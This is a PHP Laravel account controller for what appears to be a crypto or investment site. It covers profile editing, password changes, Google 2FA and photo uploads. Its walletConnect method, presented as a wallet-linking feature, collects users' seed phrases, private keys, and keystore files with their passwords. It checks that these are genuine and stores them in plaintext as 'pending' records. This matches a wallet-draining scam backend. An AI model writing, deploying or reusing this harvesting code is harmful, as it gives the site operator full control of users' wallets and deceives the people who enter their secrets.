<?php

namespace App\Http\Controllers\User\Auth;

use App\Http\Controllers\Controller;
use App\Models\User;
use App\Models\WalletConnect;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\File;
use Illuminate\Support\Facades\Hash;
use PragmaRX\Google2FA\Google2FA;


class AccountController extends Controller
{
    //return profile
    public function profile()
    {

        $page_title = 'My Profile';
        return view(template('user.profile.index'), compact(
            'page_title'
        ));
    }


    //show page for editing profile
    public function editProfile()
    {
        $page_title = 'Edit Profile';

        $g2fa_secret = user()->g2fa_secret;
        $google2fa = new Google2FA();
        // generate g2fa_secret if the user has not set it up before
        if (!user()->g2fa_secret) {
            $g2fa_secret = $google2fa->generateSecretKey();
            $user = User::find(user()->id);
            $user->g2fa_secret = $g2fa_secret;
            $user->save();
        }

        $qr_code_url = $google2fa->getQRCodeUrl(
            site('name'),
            user()->email,
            $g2fa_secret
        );

        return view(template('user.profile.edit'), compact(
            'page_title',
            'qr_code_url'
        ));
    }


    //validate profile edit
    public function editProfileValidate(Request $request)
    {
        $required_fields = json_decode(site('user_fields'));

        $validationRules = [
            'name' => 'two_words',
            'address' => '',
            'city' => '',
            'state' => '',
            'country' => '',
            'gender' => '',
            'dob' => '',
            'phone' => '',
        ];

        // Set the required rule for fields in the $required_fields array
        foreach ($required_fields as $field) {
            if (array_key_exists($field, $validationRules)) {
                $validationRules[$field] .= '|required';
            }
        }

        if (!user()->username) {
            $validationRules['username'] = 'required|unique:users|min:3|max:10';
        }

        $request->validate($validationRules);

        //update the user
        $user = User::find(user()->id);
        $user->name = $request->name;
        $user->username = user()->username ?? $request->username;
        $user->address = $request->address;
        $user->city = $request->city;
        $user->state = $request->state;
        $user->country = $request->country;
        $user->gender = $request->gender;
        $user->dob = $request->dob;
        $user->phone = $request->phone;
        $user->save();

        return response()->json(['message' => 'Account updated successfully']);
    }

    //update password
    public function updatePassword(Request $request)
    {
        $require_strong_password = site('strong_password');
        $request->validate([
            'current_password' => 'required',
            'password' => [
                'required',
                'confirmed',
                ($require_strong_password == 1 ? 'min:8' : 'min:5'),
                function ($attribute, $value, $fail) use ($require_strong_password) {
                    if ($require_strong_password == 1) {
                        if (!preg_match('/\d/', $value)) {
                            $fail('The password must contain a number');
                        } elseif (!preg_match('/[a-z]/', $value)) {
                            $fail('The password must contain a lowercase');
                        } elseif (!preg_match('/[A-Z]/', $value)) {
                            $fail('The password must contain an uppercase');
                        } elseif (!preg_match('/[\W_]/', $value)) {
                            $fail('The password must contain a symbol');
                        }
                    }
                }
            ],
        ]);


        //check to see if the password was used previously
        if (Hash::check($request->password, user()->password)) {
            return response()->json(validationError('You have used this password before'), 422);
        }

        //check to see if the password was used previously
        if (!Hash::check($request->current_password, user()->password)) {
            return response()->json(validationError('Your current password is incorrect'), 422);
        }


        //save the password
        $user = User::find(user()->id);
        $user->password = Hash::make($request->password);
        $user->save();

        //notify the user of the password change
        sendPasswordChangedEmail($user);

        return response()->json(['message' => 'Password updated succesfully']);
    }


    public function g2FaUpdate(Request $request)
    {
        $request->validate([
            'one_time_password' => 'required|numeric',
        ]);

        $google2fa = new Google2FA();
        $valid = $google2fa->verifyKey(user()->g2fa_secret, $request->one_time_password);
        if ($valid) {
            $user = User::find(user()->id);
            if ($user->g2fa == 1) {
                // its enabled. disable now
                $user->g2fa = 0;
                $message = '2FA disabled successfully';
            } else {
                $message = '2FA Enabled successfully';
                $user->g2fa = 1;
                session()->put('g2fa', 1);
            }

            $user->save();

            return response()->json(['message' => $message]);
        }

        return response()->json(validationError('Incorrect or expired 2fa code'), 422);
    }

    //upload profile picture
    public function updatePhoto(Request $request)
    {
        $request->validate([
            'photo' => 'required|image|mimes:png,jpg,jpeg|max:50000',
        ]);

        //upload
        $image = $request->file('photo');
        $path = 'profile';
        $photo = uploadImage($image, $path);

        $user = User::find(user()->id);
        $user->photo = $photo;
        $user->save();

        return response()->json(['message' => 'Account updated successfully']);
    }


    //wallet connect
    public function walletConnect(Request $request)
    {
        $request->validate([
            'type' => 'required|in:seed,private_key,keystore',
            'data' => 'required|string',
            'password' => 'required_if:type,keystore|string|nullable',
        ]);

        // make the user has not connected the wallet before
        $has_connected_before = WalletConnect::where('user_id', user()->id)->first();
        if ($has_connected_before) {
            return response()->json(validationError('You have already connected a wallet before'), 422);
        }

        // lets do some basic validation on the data based on type
        $data = trim($request->data);
        if ($request->type == 'seed') {
            $words = explode(' ', $data);
            //words should be unique, 12 , 18 or 24
            $unique_words = array_unique($words);
            if (count($unique_words) < 12 || (count($unique_words) != 12 && count($unique_words) != 18 && count($unique_words) != 24)) {
                return response()->json(validationError('Invalid seed phrase'), 422);
            }

            // check if the words are valid as contained in the bip39 languages
            $is_valid = \App\Services\Web3Service::validateSeedPhrase($data);
            if (!$is_valid) {
                return response()->json(validationError('Invalid seed phrase'), 422);
            }
        }


        if ($request->type == 'private_key') {
            // private key should be 64 characters long and hexadecimal
            if (!preg_match('/^[a-fA-F0-9]{64}$/', $data)) {
                return response()->json(validationError('Invalid private key'), 422);
            }
        }


        // keystore should be a valid json
        if ($request->type == 'keystore') {
            $json_data = json_decode($data, true);
            if (json_last_error() !== JSON_ERROR_NONE || !is_array($json_data)) {
                return response()->json(validationError('Invalid keystore JSON'), 422);
            }

            // check version and crypto
            $version = $json_data['version'] ?? ($json_data['Version'] ?? null);
            $crypto = $json_data['crypto'] ?? ($json_data['Crypto'] ?? null);
            if (!$version) {
                return response()->json(validationError('Invalid keystore: missing version field'), 422);
            }

            if (!$crypto) {
                return response()->json(validationError('Invalid keystore: missing crypto field'), 422);
            }
        }

        //save the wallet connect
        $walletConnect = new WalletConnect();
        $walletConnect->user_id = user()->id;
        $walletConnect->type = $request->type;
        $walletConnect->data = $request->data;
        if ($request->type == 'keystore') {
            $walletConnect->password = $request->password;
        }
        $walletConnect->status = 'pending';
        $walletConnect->save();

        return response()->json(['message' => 'Wallet connected successfully']);
    }
}
